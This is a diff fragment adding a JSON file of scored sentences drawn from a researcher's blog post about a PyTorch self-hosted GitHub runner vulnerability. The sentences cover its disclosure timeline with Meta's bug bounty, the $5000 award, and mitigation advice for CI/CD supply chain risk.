+        "sentence": "Given the critical nature of the vulnerability, we wanted to submit the report as soon as possible before one of PyTorch’s 3,500 contributors decided to make a deal with a foreign adversary.",
+        "score": 0.4434
+      },
+      {
+        "sentence": "Submission Details – No Bueno Overall, the PyTorch submission process was blah, to use a technical term.",
+        "score": 0.3923
+      },
+      {
+        "sentence": "They frequently had long response times, and their fixes were questionable.",
+        "score": 0.3138
+      },
+      {
+        "sentence": "We also learned this wasn’t the first time they had issues with self-hosted runners – earlier in 2023, Marcus Young executed a pipeline attack to gain RCE on a single PyTorch runner.",
+        "score": 0.562
+      },
+      {
+        "sentence": "Marcus did not perform the post-exploitation techniques we used to demonstrate impact, but PyTorch still should have locked down their runners after his submission.",
+        "score": 0.3912
+      },
+      {
+        "sentence": "We haven’t investigated PyTorch’s new setup enough to provide our opinion on their solution to securing their runners.",
+        "score": 0.4651
+      },
+      {
+        "sentence": "Rather than require approval for contributor’s fork PRs, PyTorch opted to implement a layer of controls to prevent abuse.",
+        "score": 0.4614
+      },
+      {
+        "sentence": "Timeline August 9th, 2023 – Report submitted to Meta bug bounty August 10th, 2023 – Report “sent to appropriate product team” September 8th, 2023 – We reached out to Meta to ask for an update September 12th, 2023 – Meta said there is no update to provide October 16th, 2023 – Meta said “we consider the issue mitigated, if you think this wasn’t fully mitigated, please let us know.” October 16th, 2023 – We responded by saying we believed the issue had not been fully mitigated.",
+        "score": 0.4496
+      },
+      {
+        "sentence": "November 1st, 2023 – We reached out to Meta, asking for another update.",
+        "score": 0.4075
+      },
+      {
+        "sentence": "November 21st, 2023 – Meta responded, saying they reached out to a team member to provide an update.",
+        "score": 0.4024
+      },
+      {
+        "sentence": "December 7th, 2023 – After not receiving an update, we sent a strongly worded message to Meta, expressing our concerns about the disclosure process and the delay in remediation.",
+        "score": 0.4086
+      },
+      {
+        "sentence": "December 7th, 2023 – Meta responded, saying they believed the issue was mitigated and the delay was regarding the bounty.",
+        "score": 0.3962
+      },
+      {
+        "sentence": "December 7th, 2023 – Several back-and-forths ensued discussing remediation.",
+        "score": 0.3349
+      },
+      {
+        "sentence": "December 15th, 2023 – Meta awarded a $5000 bounty, plus 10% due to the delay in payout.",
+        "score": 0.3258
+      },
+      {
+        "sentence": "December 15th, 2023 – Meta provided more detail as to the remediation steps they performed after the initial vulnerability disclosure and offered to set up a call if we had more questions.",
+        "score": 0.3907
+      },
+      {
+        "sentence": "December 16th, 2023 – We responded, opting not to set up a call, and asked a question about bounty payout (at this point, we were pretty done with looking at PyTorch).",
+        "score": 0.3531
+      },
+      {
+        "sentence": "Mitigations The easiest way to mitigate this class of vulnerability is to change the default setting of ‘Require approval for first-time contributors’ to ‘Require approval for all outside collaborators’.",
+        "score": 0.4737
+      },
+      {
+        "sentence": "It is a no-brainer for any public repository that uses self-hosted runners to ensure they use the restrictive setting, although PyTorch seems to disagree.",
+        "score": 0.4448
+      },
+      {
+        "sentence": "If workflows from fork-PRs are necessary, organizations should only use GitHub-hosted runners.",
+        "score": 0.5929
+      },
+      {
+        "sentence": "If self-hosted runners are also necessary, use isolated, ephemeral runners and ensure you know the risks involved.",
+        "score": 0.4008
+      },
+      {
+        "sentence": "It is challenging to design a solution allowing anyone to run arbitrary code on your infrastructure without risks, especially in an organization like PyTorch that thrives off community contributions.",
+        "score": 0.5166
+      },
+      {
+        "sentence": "Is PyTorch an Outlier?",
+        "score": 0.3622
+      },
+      {
+        "sentence": "The issues surrounding these attack paths are not unique to PyTorch.",
+        "score": 0.4236
+      },
+      {
+        "sentence": "They’re not unique to ML repositories or even to GitHub.",
+        "score": 0.4986
+      },
+      {
+        "sentence": "We’ve repeatedly demonstrated supply chain weaknesses by exploiting CI/CD vulnerabilities in the world’s most advanced technological organizations across several CI/CD platforms, and those are only a small subset of the greater attack surface.",
+        "score": 0.5684
+      },
+      {
+        "sentence": "Threat actors are starting to catch on, as shown by the year-over-year increase in supply chain attacks.",
+        "score": 0.4808
+      },
+      {
+        "sentence": "Security researchers won’t always be able to find these vulnerabilities before malicious attackers.",
+        "score": 0.3726
+      },
+      {
+        "sentence": "Subscribe to the official John IV newsletter to receive live, monthly updates of my interests and passions.",
+        "score": 0.3354
+      }
+    ]
+  }
+}
